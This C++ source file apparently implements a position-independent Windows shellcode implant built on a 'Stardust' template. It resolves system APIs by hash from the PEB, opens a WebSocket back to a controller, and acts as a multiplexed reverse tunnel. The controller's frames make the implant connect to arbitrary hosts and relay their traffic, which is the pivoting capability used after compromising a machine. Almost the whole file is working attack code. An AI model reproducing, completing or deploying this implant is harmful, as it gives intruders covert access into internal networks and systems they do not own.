#include <common.h>
#include <constexpr.h>
#include <resolve.h>
#include <memory.h>
#include <native.h>


namespace stardust {
    class instance;
}

using namespace stardust;

//from https://github.com/Karkas66/CelestialSpark/blob/main/src/main.cc
#define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )

#define MAX_CH        128

#define CMD_OPEN      1
#define CMD_DATA      2
#define CMD_CLOSE     3
#define CMD_OPEN_RESP 5

#define RECV_BUF_SZ   4000


typedef struct {
    uint16_t chan;
    stardust::instance* inst;
    SOCKET remote;
} FWD_CTX;

extern "C" auto declfn entry(_In_ void* args) -> void {
    stardust::instance()
        .start( args );
}

declfn instance::instance(void) {
    //
    // calculate the shellcode base address + size
    base.address = RipStart();
    base.length  = ( RipData() - base.address ) + END_OFFSET;

    //
    // load the modules from PEB or any other desired way
    //

    if ( ! (( ntdll.handle = resolve::module( expr::hash_string<wchar_t>( L"ntdll.dll" ) ) )) ) {
        return;
    }

    if ( ! (( kernel32.handle = resolve::module( expr::hash_string<wchar_t>( L"kernel32.dll" ) ) )) ) {
        return;
    }

    //
    // let the macro handle the resolving part automatically
    //

    RESOLVE_IMPORT( ntdll );
    RESOLVE_IMPORT( kernel32 );
}

declfn void instance::initChannels(void) {
    channels = (CH_ENTRY*)kernel32.VirtualAlloc(NULL, sizeof(CH_ENTRY) * MAX_CH, MEM_COMMIT, PAGE_READWRITE);
    if (!channels) return;
    for (int i = 0; i < MAX_CH; ++i) channels[i].sock = INVALID_SOCKET;
}

declfn DWORD WINAPI instance::forwardThread(LPVOID arg) {
    FWD_CTX *ctx = (FWD_CTX*)arg;
    instance* inst = ctx->inst;

    unsigned char buffer[RECV_BUF_SZ];
    while (1) {
        int n = inst->ws2_32.recv(ctx->remote, (char*)buffer, sizeof(buffer), 0);
        if (n <= 0) break;
        if (inst->sendFrame(CMD_DATA, ctx->chan, buffer, (unsigned short)n) != 0) break;
    }

    inst->sendFrame(CMD_CLOSE, ctx->chan, NULL, 0);
    inst->mapRemove(ctx->chan);
    inst->ws2_32.shutdown(ctx->remote, SD_BOTH);
    inst->ws2_32.closesocket(ctx->remote);
    inst->kernel32.VirtualFree(ctx, 0, MEM_RELEASE);
    return 0;
}

declfn int instance::wsSend(const unsigned char *buf, DWORD buflen) {
    if (this->hSocket == NULL) return -1;
    DWORD hr = winhttp.WinHttpWebSocketSend(this->hSocket, WINHTTP_WEB_SOCKET_BINARY_MESSAGE_BUFFER_TYPE, (LPVOID)buf, buflen);
    return (hr == ERROR_SUCCESS) ? 0 : -1;
}

declfn int instance::sendFrame(unsigned char cmd, unsigned short channel, const unsigned char *data, unsigned short pLength) {
    DWORD total = 1 + 2 + 2 + pLength;
    unsigned char *buf = (unsigned char*)kernel32.VirtualAlloc(NULL, total, MEM_COMMIT, PAGE_READWRITE);

    if (!buf) return -1;
    buf[0] = cmd;
    uint16_t ch_be = HTONS(channel);
    memory::copy(buf + 1, &ch_be, 2);
    uint16_t len_be = HTONS(pLength);
    memory::copy(buf + 3, &len_be, 2);
    if (pLength && data) memory::copy(buf + 5, (void*)data, pLength);
    int r = this->wsSend(buf, total);
    kernel32.VirtualFree(buf, 0, MEM_RELEASE);
    return r;
}

declfn int instance::mapAdd(uint16_t channel, SOCKET s) {
    if (channel >= MAX_CH) return -1;
    if (channels[channel].sock != INVALID_SOCKET) {
        return -1;
    }
    channels[channel].sock = s;
    return 0;
}

declfn SOCKET instance::mapFind(uint16_t channel) {
    SOCKET ret = INVALID_SOCKET;
    if (channel >= MAX_CH) return INVALID_SOCKET;
    ret = channels[channel].sock;
    return ret;
}

declfn void instance::mapRemove(uint16_t channel) {
    if (channel >= MAX_CH) return;
    if (channels[channel].sock != INVALID_SOCKET) {
        ws2_32.closesocket(channels[channel].sock);
        channels[channel].sock = INVALID_SOCKET;
    }
}

declfn void instance::hOpen(unsigned short channel, const unsigned char *data, unsigned short pLength){
    if (pLength < 3) {
        unsigned char st = 1;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, sizeof(st));
        return;
    }

    uint16_t portNet;
    memory::copy(&portNet, (void*)(data + pLength - 2), 2);
    uint16_t port = HTONS(portNet);

    int hostLength = pLength - 2;
    if (hostLength > 0 && data[hostLength - 1] == '\0') hostLength--;

    char hostBuf[256];
    if (hostLength <= 0 || hostLength >= (int)sizeof(hostBuf)) {
        unsigned char st = 2;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, 1);
        return;
    }
    memory::copy(hostBuf, (void*)data, hostLength);
    hostBuf[hostLength] = 0;

    struct addrinfo req;
    struct addrinfo *res = NULL;
    char portString[8];

    //Gemini int to string conversion
    int p = port;
    int idx = 0;
    if (p == 0) { portString[idx++] = '0'; }
    else {
        int tmp = p;
        char rev[8]; int ridx = 0;
        while (tmp > 0 && ridx < (int)sizeof(rev)) { rev[ridx++] = (char)('0' + (tmp % 10)); tmp /= 10; }
        while (ridx > 0) portString[idx++] = rev[--ridx];
    }
    portString[idx] = 0;

    memory::zero(&req, sizeof(req));
    req.ai_family = AF_UNSPEC;
    req.ai_socktype = SOCK_STREAM;
    if (ws2_32.getaddrinfo(hostBuf, portString, &req, &res) != 0) {
        unsigned char st = 3;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, 1);
        return;
    }

    //Gemini resolution loop

    SOCKET remote = INVALID_SOCKET;
    struct addrinfo *ai;

    for (ai = res; ai; ai = ai->ai_next) {
        remote = ws2_32.socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (remote == INVALID_SOCKET) continue;
        if (ws2_32.connect(remote, ai->ai_addr, (int)ai->ai_addrlen) == 0) break;
        ws2_32.closesocket(remote); remote = INVALID_SOCKET;
    }
    ws2_32.freeaddrinfo(res);


    if (remote == INVALID_SOCKET) {
        unsigned char st = 4;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, 4);
        return;
    }


    if (channel >= MAX_CH) {
        ws2_32.closesocket(remote);
        unsigned char st = 5;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, 5);
        return;
    }

    if (this->mapAdd(channel, remote) != 0) {
        ws2_32.closesocket(remote);
        unsigned char st = 6;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, 6);
        return;
    }


    //forwarder for socket
    FWD_CTX *ctx = (FWD_CTX*)kernel32.VirtualAlloc(NULL, sizeof(FWD_CTX), MEM_COMMIT, PAGE_READWRITE);
    if (!ctx) {
        this->mapRemove(channel);
        ws2_32.closesocket(remote);
        unsigned char st = 7;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, 7);
        return;
    }
    ctx->chan = channel;
    ctx->inst = this;
    ctx->remote = remote;

    HANDLE th = kernel32.CreateThread(NULL, 0, instance::forwardThread, ctx, 0, NULL);
    if (!th) {
        kernel32.VirtualFree(ctx, 0, MEM_RELEASE);
        this->mapRemove(channel);
        ws2_32.closesocket(remote);
        unsigned char st = 8;
        this->sendFrame(CMD_OPEN_RESP, channel, &st, 8);
        return;
    } else {
        kernel32.CloseHandle(th);
    }
    unsigned char st = 0;
    this->sendFrame(CMD_OPEN_RESP, channel, &st, 1);
}

declfn void instance::hData(unsigned short channel, const unsigned char *data, unsigned short pLength){
    if (channel >= MAX_CH) return;
    SOCKET s = this->mapFind(channel);
    if (s == INVALID_SOCKET) {
        this->sendFrame(CMD_CLOSE, channel, NULL, 0);
        return;
    }
    if (pLength > 0) {
        int sent = ws2_32.send(s, (const char*)data, pLength, 0);
        if (sent == SOCKET_ERROR) {
            this->mapRemove(channel);
            this->sendFrame(CMD_CLOSE, channel, NULL, 0);
        }
    }
}

declfn void instance::hClose(unsigned short channel){
    this->mapRemove(channel);
    return;
}

declfn void instance::wsLoop() {
    while (1) {
        //Allocate RW Memory for incoming data
        DWORD bufsize = RECV_BUF_SZ;
        unsigned char *buf = (unsigned char*)kernel32.VirtualAlloc(NULL, bufsize, MEM_COMMIT, PAGE_READWRITE);
        if (buf == NULL){
            break;
        }

        DWORD received = 0;
        WINHTTP_WEB_SOCKET_BUFFER_TYPE bufferType;

        //Recieve data from WebSocket
        HRESULT hr = winhttp.WinHttpWebSocketReceive(this->hSocket, buf, bufsize, &received, &bufferType);
        if (FAILED(hr) || received == 0) {
            kernel32.VirtualFree(buf, 0, MEM_RELEASE);
            break;
        }

        //Parse Frame of incoming data
        unsigned int off = 0;
        while (off + 5 <= received) {
            unsigned char cmd = buf[off];
            uint16_t channel_net, fLength_net;

            memory::copy(&channel_net, buf + off + 1, 2);
            memory::copy(&fLength_net, buf + off + 3, 2);

            unsigned short channel = HTONS(channel_net);
            unsigned short fLength = HTONS(fLength_net);

            if (off + 5 + fLength > received) break;

            const unsigned char* data = buf + off + 5;


            if (cmd == CMD_OPEN) {
                this->hOpen(channel, data, fLength);
            } else if (cmd == CMD_DATA) {
                this->hData(channel, data, fLength);
            } else if (cmd == CMD_CLOSE) {
                this->hClose(channel);
            }

            off += 5 + fLength;
        }
        kernel32.VirtualFree(buf, 0, MEM_RELEASE);
    }
}

declfn HINTERNET instance::wsConnect(const wchar_t *host,  const wchar_t *path) {
    HINTERNET hSession = winhttp.WinHttpOpen(L"alienatedgeist", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) {
        return NULL;
    }

    HINTERNET hConnect = winhttp.WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        winhttp.WinHttpCloseHandle(hSession);
        return NULL;
    }

    HINTERNET hRequest = winhttp.WinHttpOpenRequest(hConnect, L"GET", path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) {
        winhttp.WinHttpCloseHandle(hConnect);
        winhttp.WinHttpCloseHandle(hSession);
        return NULL;
    }

    BOOL bResults = winhttp.WinHttpSetOption(hRequest, WINHTTP_OPTION_UPGRADE_TO_WEB_SOCKET, NULL, 0);
    if (!bResults) {
        winhttp.WinHttpCloseHandle(hRequest);
        winhttp.WinHttpCloseHandle(hConnect);
        winhttp.WinHttpCloseHandle(hSession);
        return NULL;
    }

    bResults = winhttp.WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    if (!bResults) {
        winhttp.WinHttpCloseHandle(hRequest);
        winhttp.WinHttpCloseHandle(hConnect);
        winhttp.WinHttpCloseHandle(hSession);
        return NULL;
    }

    bResults = winhttp.WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) {
        winhttp.WinHttpCloseHandle(hRequest);
        winhttp.WinHttpCloseHandle(hConnect);
        winhttp.WinHttpCloseHandle(hSession);
        return NULL;
    }

    HINTERNET hWebSocket = winhttp.WinHttpWebSocketCompleteUpgrade(hRequest, (DWORD_PTR)NULL);
    if (!hWebSocket) {
        winhttp.WinHttpCloseHandle(hRequest);
        winhttp.WinHttpCloseHandle(hConnect);
        winhttp.WinHttpCloseHandle(hSession);
        return NULL;
    }

    return hWebSocket;
}

auto declfn instance::start( _In_ void* arg) -> void {
    //Retrieve ws2 handle
    ws2_32.handle = reinterpret_cast<uintptr_t>(kernel32.LoadLibraryA( symbol<const char*>("ws2_32.dll")));
    if (ws2_32.handle) {
        WSADATA wsaData;
        RESOLVE_IMPORT( ws2_32 );
        WORD wVersionRequested = MAKEWORD(2, 2);
        if (ws2_32.WSAStartup(wVersionRequested, &wsaData) != 0) {
            return;
        }
    }

    //Retrieve winhttp handle
    winhttp.handle = reinterpret_cast<uintptr_t>(kernel32.LoadLibraryA( symbol<const char*>( "winhttp.dll" )));

    DBG_PRINTF( "running from %ls (Pid: %d)\n",
        NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer,
        NtCurrentTeb()->ClientId.UniqueProcess );

    DBG_PRINTF( "shellcode @ %p [%d bytes]\n", base.address, base.length );

    //Init channels for multiplexing/sockets
    this->initChannels();

    if (winhttp.handle) {
        RESOLVE_IMPORT( winhttp );
        //Connect to WebSocket endpoint
        this->hSocket = this->wsConnect(L"127.0.0.1", L"/ws");
        if (this->hSocket) {
            DBG_PRINTF("Successfully connected WebSocket, entering loop...\n");
            //Loop WS endpoint for incoming connections
            this->wsLoop();

            winhttp.WinHttpCloseHandle(this->hSocket);
            this->hSocket = NULL;
        } else {
            DBG_PRINTF("WebSocket connection failed.\n");
        }
    }
    if (ws2_32.handle) {
        ws2_32.WSACleanup();
    }
}
